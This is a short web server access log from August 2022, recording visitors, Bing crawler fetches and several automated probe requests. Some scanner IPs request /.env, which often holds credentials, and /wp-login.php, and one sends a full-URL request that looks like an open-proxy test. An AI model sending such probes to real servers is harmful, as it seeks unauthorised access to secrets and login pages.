::ffff:185.254.196.115 - - [21/Aug/2022:13:35:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [21/Aug/2022:13:35:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:118.123.105.85 - - [21/Aug/2022:13:42:08 +0000] "GET / HTTP/1.1" 200 57533 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
::ffff:118.123.105.85 - - [21/Aug/2022:13:42:09 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://34.212.47.6/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
::ffff:118.123.105.85 - - [21/Aug/2022:13:42:22 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://34.212.47.6/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
::ffff:2.57.122.225 - - [21/Aug/2022:13:46:41 +0000] "GET http://example.com/ HTTP/1.1" 200 57533 "-" "Go-http-client/1.1"
::ffff:207.46.13.113 - - [21/Aug/2022:13:50:45 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
::ffff:40.77.167.96 - - [21/Aug/2022:14:09:16 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:207.46.13.113 - - [21/Aug/2022:14:09:27 +0000] "GET /locations.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.246.189 - - [21/Aug/2022:14:10:24 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [21/Aug/2022:14:10:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:128.199.178.73 - - [21/Aug/2022:14:13:13 +0000] "GET /wp-login.php HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96"
